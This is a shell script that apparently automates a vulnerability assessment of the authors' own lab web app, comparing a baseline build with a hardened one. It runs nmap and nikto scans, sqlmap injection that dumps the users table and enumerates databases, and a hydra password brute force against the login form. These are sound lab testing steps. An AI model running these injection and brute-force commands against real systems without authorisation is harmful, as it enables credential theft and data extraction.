#!/bin/sh
# Runs the CLI parts of docs/KALI_TEST_PLAN.md from the Kali VM against our own lab host only.
# Usage (on Kali): sh kali_run.sh <host-ip> <baseline-user> <baseline-password>
H=${1:-192.168.56.1}; U=${2:-meera}; P=$3
B=http://$H:5444; S=https://$H:5443
E=$HOME/vapt-evidence; mkdir -p "$E"; cd "$E" || exit 1
step() { echo "=== $(date '+%F %T') $1" | tee -a run.log; }

step "nmap full port scan"
# shortcut: top 1000 ports + app ports, not -p-; a full sweep over the VirtualBox host-only adapter takes hours.
# Run -p- overnight if the report needs every port.
nmap -T4 --max-retries 1 --top-ports 1000 "$H" -oN nmap_ports.txt >/dev/null
nmap -sV -p 5443,5444 "$H" -oN nmap_app_ports.txt >/dev/null
step "nmap headers/methods"
nmap --script http-headers,http-methods -p 5444 "$H" -oN nmap_http_baseline.txt >/dev/null
nmap --script http-headers,http-methods,ssl-enum-ciphers -p 5443 "$H" -oN nmap_https_hardened.txt >/dev/null

step "curl headers + cookies"
curl -s -D - -o /dev/null "$B/login" > headers_baseline.txt
curl -sk -D - -o /dev/null "$S/login" > headers_hardened.txt

step "sqlmap baseline login (dump users)"
sqlmap -u "$B/login" --data="username=x&password=x" --batch --risk=3 --level=5 --dump -T users \
  --output-dir="$E/sqlmap" > sqlmap_baseline_login.txt 2>&1

step "sqlmap baseline patient search (authenticated)"
rm -f jar; curl -s -c jar -o /dev/null "$B/login"
curl -s -b jar -c jar -o /dev/null --data-urlencode "username=$U" --data-urlencode "password=$P" "$B/login"
C=$(awk '$6=="sh_session"{print $7}' jar)
echo "session cookie obtained: ${C:+yes}" >> run.log
sqlmap -u "$B/patients/?q=x" --cookie="sh_session=$C" --batch --dbs \
  --output-dir="$E/sqlmap" > sqlmap_baseline_search.txt 2>&1

step "sqlmap hardened login (fresh CSRF token per request)"
sqlmap -u "$S/login" --data="csrf_token=x&username=x&password=x" --csrf-token=csrf_token \
  --skip=csrf_token --batch --risk=3 --level=5 --output-dir="$E/sqlmap" > sqlmap_hardened_login.txt 2>&1

step "nikto"
nikto -h "$B" -o nikto_baseline.txt -Format txt >/dev/null 2>&1
nikto -h "$S" -ssl -o nikto_hardened.txt -Format txt >/dev/null 2>&1

step "hydra baseline (top-100 rockyou + the real password planted at the end)"
zcat /usr/share/wordlists/rockyou.txt.gz 2>/dev/null | head -100 > words.txt || head -100 /usr/share/wordlists/rockyou.txt > words.txt
echo "$P" >> words.txt
hydra -l "$U" -P words.txt -s 5444 "$H" http-post-form "/login:username=^USER^&password=^PASS^:F=Wrong password" \
  > hydra_baseline.txt 2>&1
# Hardened brute force is not run with hydra: it needs a fresh CSRF token per request, so hydra
# only sees 400s. Lockout is evidenced by vapt/live_attack.py and the dashboard alert instead.

step "done"
